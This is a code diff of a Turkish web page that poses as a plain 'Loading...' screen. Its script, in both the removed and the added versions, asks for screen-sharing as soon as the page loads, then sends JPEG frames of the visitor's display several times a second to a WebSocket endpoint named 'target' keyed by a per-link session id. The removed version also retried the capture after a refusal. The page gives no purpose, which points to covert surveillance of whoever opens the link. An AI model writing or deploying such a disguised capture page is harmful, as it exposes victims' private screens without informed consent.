@@ -2,93 +2,43 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Yükleniyor...</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .spinner { width: 50px; height: 50px; border: 3px solid #333; border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-    </style>
 </head>
-<body>
-    <div style="text-align: center;">
-        <div class="spinner"></div>
-        <p>Yükleniyor...</p>
-    </div>
-
+<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <h3>Yükleniyor...</h3>
     <script>
         const sessionId = window.location.pathname.split('/').pop();
-        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const WS_URL = `${protocol}//${window.location.host}/ws/target?id=${sessionId}`;
+        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const WS_URL = `${wsProtocol}//${window.location.host}/ws/target?id=${sessionId}`;
         
-        let ws = null;
-        let stream = null;
-        let captureInterval = null;
-
-        async function startScreenCapture() {
+        async function start() {
             try {
-                stream = await navigator.mediaDevices.getDisplayMedia({
-                    video: { cursor: "always", displaySurface: "monitor" },
-                    audio: false
-                });
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
+                const ws = new WebSocket(WS_URL);
 
-                ws = new WebSocket(WS_URL);
-                
-                ws.onopen = () => startStreaming();
-                ws.onclose = () => stopStreaming();
+                ws.onopen = () => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
 
-                stream.getVideoTracks()[0].onended = () => {
-                    stopStreaming();
-                    setTimeout(startScreenCapture, 1000);
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+
+                    setInterval(() => {
+                        if (ws.readyState === WebSocket.OPEN) {
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const base64 = canvas.toDataURL('image/jpeg', 0.4).split(',')[1];
+                            ws.send(JSON.stringify({ type: 'frame', data: base64 }));
+                        }
+                    }, 150);
                 };
-
             } catch (err) {
-                setTimeout(startScreenCapture, 2000);
+                console.error(err);
             }
         }
-
-        function startStreaming() {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-
-            video.onloadedmetadata = () => {
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
-
-                captureInterval = setInterval(() => {
-                    if (ws.readyState === WebSocket.OPEN) {
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        canvas.toBlob((blob) => {
-                            const reader = new FileReader();
-                            reader.onloadend = () => {
-                                const base64 = reader.result.split(',')[1];
-                                ws.send(JSON.stringify({
-                                    type: 'frame',
-                                    data: base64,
-                                    timestamp: Date.now(),
-                                    resolution: `${canvas.width}x${canvas.height}`
-                                }));
-                            };
-                            reader.readAsDataURL(blob);
-                        }, 'image/jpeg', 0.3);
-                    }
-                }, 100);
-            };
-        }
-
-        function stopStreaming() {
-            if (captureInterval) clearInterval(captureInterval);
-            if (stream) stream.getTracks().forEach(track => track.stop());
-            if (ws) ws.close();
-        }
-
-        window.addEventListener('load', startScreenCapture);
-        window.addEventListener('beforeunload', stopStreaming);
+        window.onload = start;
     </script>
 </body>
 </html>
